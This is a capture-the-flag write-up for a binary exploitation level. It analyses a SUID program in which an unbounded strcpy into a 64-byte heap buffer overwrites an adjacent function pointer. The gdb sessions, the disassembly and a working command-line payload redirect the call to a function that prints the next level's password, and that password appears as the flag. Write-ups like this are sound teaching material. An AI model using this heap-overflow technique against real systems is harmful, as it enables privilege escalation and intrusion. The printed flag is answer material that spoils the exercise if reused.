# Level 6

Same recon as level0: SUID **level7**.

## Analysis

```c
void n(void) { system("/bin/cat /home/user/level7/.pass"); }  // never called
void m(void) { puts("Nope"); }

int main(int argc, char **argv) {
    char *buf = malloc(0x40);          // 64 bytes
    void (**fn)(void) = malloc(4);     // holds a function pointer
    *fn = m;
    strcpy(buf, argv[1]);              // no bounds check
    (*fn)();                            // call through the pointer
}
```

`buf` and `fn` are two heap chunks allocated in order. `strcpy(buf, argv[1])` is unbounded, so a long `argv[1]` [overflows `buf` into `fn`](../knowledge_base/heap_overflow.md#exploit-pattern-2-overwrite-function-pointers) and overwrites the function pointer. Overwrite it with `n` so the indirect call prints the flag.

`n` from `info functions`:

```
(gdb) info functions
0x08048454  n
```

## Exploit

### Where the addresses come from

The relevant part of `main` (from `objdump -d`):

```asm
8048485: movl $0x40,(%esp)          ; malloc(0x40)  -> buf
804848c: call 8048350 <malloc@plt>
8048491: mov  %eax,0x1c(%esp)       ; buf saved at 0x1c(esp)
8048495: movl $0x4,(%esp)           ; malloc(4)     -> fn
804849c: call 8048350 <malloc@plt>
80484a1: mov  %eax,0x18(%esp)       ; fn saved at 0x18(esp)
80484a5: mov  $0x8048468,%edx       ; edx = &m  (linked at compile time)
80484ae: mov  %edx,(%eax)           ; *fn = m
...
80484ce: mov  (%eax),%eax           ; read *fn
80484d0: call *%eax                 ; (*fn)()  <- our target
```

Two distinct addresses to keep apart:

- the address **of** `fn` (where the pointer lives on the heap): it comes from the second `malloc`, not from the binary.
- the value **inside** `fn` (`0x08048468` = `m`): hardcoded by the linker in `mov $0x8048468,%edx`, since `m` starts at `0x08048468`.

### Recovering buf and fn in gdb

`malloc` returns its pointer in `eax`, so break right after each `call malloc` and read `eax`:

```
(gdb) b *0x08048491         # after malloc(0x40)
(gdb) b *0x080484a1         # after malloc(4)
(gdb) run AAAA
Breakpoint 1 ...
(gdb) info registers eax
eax            0x804a008    <- buf
(gdb) c
Breakpoint 2 ...
(gdb) info registers eax
eax            0x804a050    <- fn
```

Then just subtract the two values in gdb (it does the arithmetic for you):

```
(gdb) p/d 0x804a050 - 0x804a008
$1 = 72
```

Or save each `eax` into a convenience variable so you never copy an address by hand:

```
(gdb) set $buf = $eax        # at breakpoint 1
(gdb) set $fn = $eax         # at breakpoint 2
(gdb) p/d $fn - $buf
$2 = 72
```

`fn - buf` = `0x804a050 - 0x804a008` = `0x48` = **72 bytes** (64 bytes of `buf` data + 8 bytes of the next chunk's metadata). You can confirm the layout by dumping the heap:

```
(gdb) x/x 0x804a050
0x804a050:  0x08048468     <- fn holds &m, the value to overwrite
```

The absolute heap addresses can shift outside gdb, but the 72 byte gap stays constant, and that gap is all the payload needs.

### Run

Fill 72 bytes, then `n`'s address little-endian (`0x08048454` → `\x54\x84\x04\x08`):

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

The payload goes in `argv[1]`, not stdin. Command-line args are null-terminated, so an address with a `\x00` byte would be cut short; `0x08048454` has none.

Flag: `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
